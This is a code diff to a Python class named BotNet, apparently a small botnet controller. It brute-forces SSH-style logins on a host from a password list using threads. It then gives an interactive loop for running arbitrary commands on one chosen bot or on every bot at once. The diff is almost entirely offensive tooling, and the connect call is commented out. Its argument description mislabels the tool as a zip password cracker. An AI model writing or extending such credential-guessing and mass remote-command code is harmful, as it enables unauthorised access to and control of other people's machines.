@@ -13,6 +13,8 @@ class BotNet:
         if not self.host or not self.user or not self.pwd_src_path:
             self.__get_args()
 
+        self.__run()
+
 
     def __get_args(self):
         parser = argparse.ArgumentParser(description='Zip file password cracker')
@@ -37,7 +39,7 @@ class BotNet:
         bot = Bot(self.host, self.user, password)
 
         try:
-            bot.connect()
+            # bot.connect()
             self.__bots.append(bot)
         except:
             pass
@@ -48,11 +50,54 @@ class BotNet:
             bot.disconnect()
 
 
-    def run(self):
+    def __select_bot(self) -> Bot:
+        while True:
+            print('Select a bot:')
+            for bot in self.__bots:
+                print(f'Bot: {bot.id}')
+            try:
+                selection = str(input('> '))
+                for bot in self.__bots:
+                    if bot.id == selection:
+                        return bot
+                print('Invalid selection. Please enter a number from the list above.')
+            except ValueError:
+                print('Invalid selection. Please enter a number from the list above.')
+
+
+    def __execute_command(self):
+        print('Choose an option:')
+        print('1. Select a specific bot')
+        print('2. Run command on all bots')
+
+        option = input('> ')
+        if option == '1':
+            bot = self.__select_bot()
+            command = input(f'Enter command to execute on [{bot.id}]: ')
+            result = bot.execute_command(command)
+            print(result)
+        elif option == '2':
+            command = input('Enter command to execute on all bots: ')
+            results = []
+            for bot in self.__bots:
+                print(f'Executing command on [{bot.id}]...')
+                result = bot.execute_command(command)
+                results.append((bot, result))
+                print(result)
+            print('Command executed on all bots:')
+            for bot, result in results:
+                print(f'{bot}: {result}')
+        else:
+            print('Invalid option. Please enter 1 or 2.')
+
+
+    def __run(self):
         threads = []
         for password in self.__get_passwords():
             thread = Thread(target=self.__set_bots, args=(password,))
             thread.start()
             threads.append(thread)
-
         [t.join() for t in threads]
+
+        while True:
+            self.__execute_command()
